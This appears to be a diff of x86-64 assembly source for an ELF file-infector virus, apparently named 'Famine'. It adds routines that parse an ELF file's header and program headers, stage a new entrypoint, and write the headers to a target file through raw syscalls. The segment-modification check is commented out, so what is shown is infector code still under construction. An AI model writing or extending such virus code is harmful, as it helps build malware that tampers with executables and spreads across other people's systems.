@@ -244,6 +244,7 @@ famine_file:
 	je leave_famine_file; skip if we couldn't create add
 	mov rdi, [rsp + 4]; void *file
 	mov rsi, rax; wfd
+	mov rdx, [rsp + 12]; fsize
 	call parse64elf
 	; end parse MAGIC
 	
@@ -434,17 +435,21 @@ push rdx
 	pop rcx
 retn
 
-; void parse64elf(void *file, int wfd)
+; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 
+	sub rsp, 8; will store pad value
+
 	call parse64elfheader
+	call parse64elfphdr ; will return pad
 
-
+	add rsp, 8
 retn
 
 parse64elfheader:
 	push rdi
 	push rsi
+	push rdx
 
 	sub rsp, 8; new entrypoint stocked here
 	;Copy the begining of Elf header till entry
@@ -471,6 +476,56 @@ parse64elfheader:
 
 	add rsp, 8
 
+	pop rdx
+	pop rsi
+	pop rdi
+retn
+
+parse64elfphdr:
+	push rdi
+	push rsi
+	push rdx
+
+	sub rsp, 2; e_phnum
+
+	mov bx,  WORD[rdi + 56]
+	mov WORD[rsp], bx; e_phnum stored
+	mov rbx, QWORD[rdi + 32]
+	add rdi, rbx; rdi now point to e_phoff
+	mov rbx, rdi; swap rdi and rsi for syscalls
+	mov rdi, rsi
+	mov rsi, rbx
+
+	xor rcx, rcx
+	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	loop_p64ephdr: 
+		cmp cx, WORD[rsp]
+		jge loop_p64ephdr_exit
+		lea r9, [rsi+rdx]; current phdr
+;		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
+;		jne print_p64ephdr
+
+		print_p64ephdr: ; case where we don't modify the phdr at all 
+			push rcx
+			push rsi
+			push rdx
+
+			mov rsi, r9
+			mov rdx, 56; sizeof(Elf64_Phdr)
+			mov rax, 1
+			syscall
+			pop rdx
+			pop rsi
+			pop rcx
+
+		continue_p64ephdr:
+		inc rcx
+		add rdx, 56; rdx += sizeof(Elf64_Phdr)
+		jmp loop_p64ephdr
+	loop_p64ephdr_exit: 
+	add rsp, 2
+
+	pop rdx
 	pop rsi
 	pop rdi
 retn
